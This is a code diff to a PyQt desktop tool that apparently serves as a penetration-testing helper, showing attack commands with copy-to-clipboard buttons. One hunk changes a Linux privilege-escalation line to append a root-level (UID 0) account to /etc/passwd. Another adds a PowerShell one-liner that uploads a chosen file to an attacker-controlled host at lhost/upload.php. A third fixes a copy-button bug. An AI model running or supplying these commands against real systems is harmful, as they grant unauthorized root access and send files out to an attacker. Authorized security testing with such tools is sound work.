@@ -5130,7 +5130,7 @@ class MainWindow(QMainWindow):
         if hasattr(self, 'lpe_passwd_Scan3'):
             self.tab3_container_layout.removeWidget(self.lpe_passwd_Scan3)
             self.lpe_passwd_Scan3.deleteLater()
-        self.lpe_passwd_Scan3 = QLabel("echo 'user1:<PASTE HASH>:user1:/home/user1:/bin/bash' >> /etc/passwd")
+        self.lpe_passwd_Scan3 = QLabel("echo 'user1:<PASTE HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd")
         self.lpe_passwd_Scan3.setStyleSheet(
             "color: 'white';" +
             "font-size: 20px;" +
@@ -11533,7 +11533,7 @@ class MainWindow(QMainWindow):
             self.AD_0_Scan1_Copy = QPushButton()
             self.AD_0_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
             self.AD_0_Scan1_Copy.setFixedSize(QSize(20,20))
-            self.AD_0_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.AD_0_Scan2.text()))
+            self.AD_0_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.AD_0_Scan1.text()))
             self.AD_0_Scan1_Copy.setStyleSheet(
                 "*:hover{background: '#20C20E';}"
             )
@@ -11604,6 +11604,39 @@ class MainWindow(QMainWindow):
             label_layout.addWidget(self.AD_0_Scan3)
             self.wpetab4_3_container_layout.insertLayout(8, label_layout)
             self.wpetab4_3_container_layout.addStretch()
+###
+            # AD_0_Scan4
+            if hasattr(self, 'AD_0_Scan4'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan4)
+                self.AD_0_Scan4.deleteLater()
+            self.AD_0_Scan4 = QLabel("powershell.exe (New-Object Net.WebClient).UploadFile('http://" + self.lhost + "/upload.php', 'FILE')")
+            self.AD_0_Scan4.setStyleSheet(
+                "color: 'white';" +
+                "font-size: 20px;" +
+                "font-style: 'bold';"
+            )
+            self.wpetab4_3_container_layout.insertWidget(9,self.AD_0_Scan4)
+         
+            # AD_0_Scan4_Copy
+            if hasattr(self, 'AD_0_Scan4_Copy'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan4_Copy)
+                self.AD_0_Scan4_Copy.deleteLater()
+            self.AD_0_Scan4_Copy = QPushButton()
+            self.AD_0_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+            self.AD_0_Scan4_Copy.setFixedSize(QSize(20,20))
+            self.AD_0_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.AD_0_Scan4.text()))
+            self.AD_0_Scan4_Copy.setStyleSheet(
+                "*:hover{background: '#20C20E';}"
+            )
+         
+            # AD_0_Scan4 adding Widgets
+            label_layout = QHBoxLayout()
+            label_layout.addWidget(self.AD_0_Scan4_Copy)
+            label_layout.addWidget(self.AD_0_Scan4)
+            self.wpetab4_3_container_layout.insertLayout(10, label_layout)
+            self.wpetab4_3_container_layout.addStretch()
+
+###
 #### TTY
     def tty(self):
         if not hasattr(self, 'tab5_container'):
